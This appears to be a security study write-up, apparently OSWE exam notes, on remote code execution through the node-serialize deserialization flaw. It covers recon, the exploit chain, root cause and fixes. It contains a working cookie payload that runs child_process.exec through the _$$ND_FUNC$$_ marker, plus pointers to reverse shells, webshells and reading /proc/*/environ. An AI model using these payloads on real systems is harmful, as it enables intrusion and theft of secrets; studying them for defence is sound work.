# Node.js Deserialization Case Study (node-serialize)

## Environment

- Host OS: Kali Linux (attacker), Ubuntu 18.04 (target)
- App: Express.js 4.16 + node-serialize 0.0.4 (vulnerable)
- Node.js: v8.x / v10.x (affected versions)
- Web URL: http://target:3000/
- Key ports: 3000 (HTTP)
- No database required (in-memory or simple cookie-based sessions)

**Install for lab**:
```bash
npm install express@4.16 node-serialize@0.0.4
```

Typical vulnerable snippet (see poc-examples/nodejs-deserialization/ for full app example).

## Recon

- Entry points: Cookie values (`profile`, `session`, `data`), POST body for profile updates, any place `unserialize` or custom deserialize runs on user data.
- Roles/privileges: Often unauthenticated or low-priv user cookie → RCE (no auth needed in classic case).
- Render locations or sinks: Server-side code that calls `serialize.unserialize()` on attacker-controlled input. Check `package.json` for "node-serialize".

**Black-box indicators**:
- Base64 or JSON-ish cookie values that contain function-like strings or `_$$ND_FUNC$$_`.
- Errors mentioning "serialize", "Function", or stack traces with `vm` / `eval`.

## Vulnerability Hypothesis

- Suspected class: Insecure deserialization (Node.js specific via node-serialize package).
- Data flow: User-controlled string (cookie/header/body) → `serialize.unserialize(userData)` → special `_$$ND_FUNC$$_` marker triggers `eval`-like behavior on the function body.
- Preconditions: 
  - Application uses the `node-serialize` package (or similar unsafe serializers like `serialize-to-js`).
  - Attacker can influence serialized data end-to-end (cookies are classic because they survive across requests without server-side validation).

## Chain Outline

1. **Discovery**: Identify node-serialize usage via package.json, source grep for `require('node-serialize')`, or observe serialized objects in cookies.
2. **Craft IIFE payload**: Create an Immediately Invoked Function Expression that uses `require('child_process').exec()` (or `spawn`) to run OS commands.
3. **Wrap with marker**: Prefix with `_$$ND_FUNC$$_` so the library treats it as serializable function.
4. **Embed in object**: Usually `{"rce": "<payload>"}` or whatever key the app expects; JSON.stringify the whole thing.
5. **Deliver**: Set as cookie (most common), POST param, or header. The server deserializes on next request/processing.
6. **Verify RCE**: Out-of-band ping/DNS/HTTP callback, sleep (if possible), or reverse shell. Node child_process is async so often fire-and-forget.
7. **Escalate** (optional): Write a persistent webshell to disk if the process has write access to webroot, or dump env/secrets.

## Evidence (Typical)

- Screenshots: Cookie sent with malicious `_$$ND_FUNC$$_...`, server response (often 200 even on success), callback received in listener.
- Logs: Node app console may show "exec" or errors if command fails; attacker nc listener or python payload_server.
- Artifacts: ysoserial not needed here — pure JS string craft. Example payload in poc.

## Findings

### Root Cause
`node-serialize` was designed for convenience and re-creates functions by wrapping them in a way that ultimately uses `eval` / `new Function` on untrusted data. There is no sandbox or allow-list. Any code inside the IIFE runs with the privileges of the Node process (often the web server user).

```javascript
// VULNERABLE (classic)
var serialize = require('node-serialize');
var profile = req.cookies.profile;   // attacker controlled
var obj = serialize.unserialize(profile);
```

The marker `_$$ND_FUNC$$_function (){ ... malicious ... }()` is the trigger.

### Why It Works
- Node's module system allows `require('child_process')` from anywhere.
- The deserializer trusts the serialized form completely.
- Cookies (and sometimes JWT-like or session blobs) are rarely integrity-protected against this at the app layer when using this lib.

### Variations & Related
- `serialize-to-js` and other "eval-based" serializers have similar issues.
- Some apps use `JSON.parse` + `vm.runInNewContext` (still dangerous if not locked down).
- Session stores or message queues that blindly deserialize can be worse (horizontal movement).

### Fix Ideas
- **Never** use node-serialize (or similar) on untrusted data. Prefer plain `JSON.parse` / `JSON.stringify` for state.
- If function serialization is truly required, use a proper isolated VM + strict allow-list of modules + no `require` inside user functions.
- Add integrity (HMAC/sign the serialized blob server-side before trusting).
- Run Node processes with least privilege (no write to webroot, limited env, seccomp if possible).
- WAF rules can catch `_$$ND_FUNC$$_` and `child_process` patterns, but this is defense-in-depth only.

### Open Questions for Further Study
- Can you achieve RCE without `child_process` (e.g., via other side effects in the app)?
- How would you do blind exfil if no outbound possible (error-based or timing)?
- What does a safe "serialize functions" design look like in 2025+ Node (e.g. using `isolated-vm` or worker threads properly)?

## Manual Exploitation Example

```bash
# 1. Observe normal cookie
curl -I http://target:3000/

# 2. Craft payload (example for ping)
PAYLOAD='{"rce":"_$$ND_FUNC$$_function (){require(\"child_process\").exec(\"ping -c 4 10.10.14.5\")}()"}'

# 3. Send (URL-encode if needed for cookie)
curl -b "profile=$PAYLOAD" http://target:3000/

# 4. Listen
sudo tcpdump -i any icmp
```

See `poc-examples/nodejs-deserialization/poc.py` for automated version with reverse shell support and recon.

## OSWE Exam Tips

- **Fast ID**: Grep `package.json` and source for `node-serialize`, `serialize`, or `_$$ND_FUNC$$_`.
- Cookie is king for this vuln — always dump and inspect cookies early.
- Payload is tiny; the hard part is often finding *where* deserialization happens (may be in middleware or a profile endpoint).
- Verification: Use a fast callback like DNS (`dig` or Burp collaborator) because reverse shell in Node can be noisy and the process may not block.
- Chaining: After RCE, check if you can reach other internal services or read source/secrets (`/proc/*/environ`, app config files).
- Common mistake: Forgetting the IIFE `()` at the end or the exact `_$$ND_FUNC$$_` prefix.
- Time saver: Hard-code a working payload template and just swap the command string.

## References

- CVE-2017-5941 and original writeup: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
- Acunetix analysis: https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/
- PayloadsAllTheThings Node section
- Related: Celestial HTB (Node deserial)
- Metasploit module for bassmaster (different but similar JS injection)

**See also**:
- `poc-examples/nodejs-deserialization/poc.py` and its Notes.md
- `guides/Code-Review-Checklists.md` (Node.js deserialization entry)
